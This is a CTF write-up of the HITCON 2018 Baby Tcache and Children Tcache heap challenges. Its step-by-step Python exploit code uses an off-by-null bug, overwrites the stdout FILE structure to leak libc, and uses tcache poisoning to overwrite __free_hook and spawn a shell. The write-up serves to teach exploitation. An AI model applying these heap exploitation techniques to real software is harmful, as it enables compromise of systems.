---
layout: post
title: "[HITCON 2018] Baby Tcache"
---

## Baby tcache

The challenge is hard because it has no leak function. Just alloc and free heap

![](https://i.imgur.com/uJBrTpL.png)

The vuln off-by-null is easy to find in **new heap** function 

![](https://i.imgur.com/I8zJ2tV.png)

```
v3[size] = 0;
```

if the malloc size & 8 == 8 then it will overwrite to the size of next chunk. It will leads to chunk overlapping so we can control all the heap. 

### Overlapping chunk

To overlap chunk, we will do all the steps below

```python
	#1 create a big chunk to prevent using Tcache. Then push it to unsortedbin.
    newheap(0x1ff0,"A") #0
	newheap(0xff0,"A") #1
	delheap(0)
    #2 Trigger off by null.
	newheap(0x108,"xx")
    #3 Create then free more than 7 chunk to push a chunk to unsortedbin
	for i in xrange(8):
		newheap(0x100,"B")
	for i in xrange(3,10):
		delheap(i)
	delheap(2)
	delheap(0)
    #4 Fix the fd/bk pointer
	for i in xrange(8):
		newheap(0x100,"\x10")
	
	delheap(0)
    # Create some chunk to use it later.
	newheap(0x200,"C")
	newheap(0x200,"C")
    #5. Overlap chunk with top chunk 
	delheap(1)  #overlap
```

heap index #1. prev_size = 0x1ef0

![](https://i.imgur.com/DBwj6Go.png)

Fix the fd/bk pointer (FD->bk==P; BK->fd==P), we can free the heap #1. Then it will merge with chunk `xx360`  and overlap all chunks between 2 chunks.

![](https://i.imgur.com/rSkHSVz.png)



Because the heap #1 is the current high end of memory so it consolidates into top chunk.

![](https://i.imgur.com/HE5Ddhw.png)



### Leak libc

This step is hard if you dont know about FILE structure. Because the author of this challenge is Angelboy :D, so i guess we should use his research in it. 

The slide File Structures: Another Binary Exploitation Technique https://www.slideshare.net/AngelBoy1/play-with-file-structure-yet-another-binary-exploit-technique and his talk in HITBGSEC 2018 https://www.youtube.com/watch?v=Fr3VU5hdL4s. Then i found the **arbitrary memory reading** by abusing the FILE structure 

```python
    #1. free all heaps to push it to tcache. Then we use technique Tcache poisoning to return to any address we want.
    for i in xrange(1,8):
            delheap(i)
	delheap(9) #0x200
	delheap(0) #0x200
    #2. Malloc heap in unsortbin.
	newheap(0x1150,"c") #0
	#3. Malloc and free to create address libc at the position of FD pointer Tcache.
	newheap(0xd0,"D")
	newheap(0x20,"C")
	newheap(0x550,"a") #3
	newheap(0x30,"a")
	delheap(3)
    #4. Overwrite 2 bytes of FD pointer of freed chunk 3. Brute-force stdout address.
	newheap(0x40,"\x60\xd7")
	newheap(0x100,"a") #6
    #5. Return stdout address.
    pl=""
    pl+=p64(0xfbad3c80) #_flags= ((stdout->flags & ~ _IO_NO_WRITES)|_IO_CURRENTLY_PUTTING)|_IO_IS_APPENDING
    pl+=p64(0) #_IO_read_ptr
    pl+=p64(0) #_IO_read_end
    pl+=p64(0) #_IO_read_base
    pl+="\x08" # overwrite last byte of _IO_write_base to point to libc address
	newheap(0x100,pl)
    #after that, puts function will print the libc address.
```

1. 

![](https://i.imgur.com/s7ZQtbW.png)

3. 

![](https://i.imgur.com/src7Rwq.png)

4. print libc address

![](https://i.imgur.com/XhRCybo.png)

### Overwrite free_hook

The last step is ez. Using Tcache poisoning to write __free_hook address to FD pointer of tcache_entry size 0x210 we prepared above

```python
	#1. overwrite fd pointer
	newheap(0x600,"A"*0x1d0+p64(libc.symbols['__free_hook']))
  	#2. Free some heaps to add new heaps
	delheap(8)
	delheap(1)
	newheap(0x200,"A")
    
    #3. Write one gadget to __free_hook
	newheap(0x200,p64(libc.address+0x4f322)) 
    #4. Trigger shelll
	delheap(0)
```

https://github.com/znqt/writeup/blob/master/2018/hitcon/babytcache/bt.py

![](https://i.imgur.com/ygkNMER.png)



## Children Tcache

Same as Baby tcache but easier because it has Show heap function.

The vuln is off-by-null because using function strcpy in New heap.

![](https://i.imgur.com/6MMczbG.png)

https://github.com/znqt/writeup/blob/master/2018/hitcon/childrentcache/ct.py

Thanks HITCON team and Angelboy for insteresting challenges.

### References

https://www.youtube.com/watch?v=Fr3VU5hdL4s

https://code.woboq.org/userspace/glibc/libio/libio.h.html

https://www.slideshare.net/AngelBoy1/play-with-file-structure-yet-another-binary-exploit-technique

https://github.com/scwuaptx/CTF/blob/master/2018-writeup/hitcon/baby_tcache.py
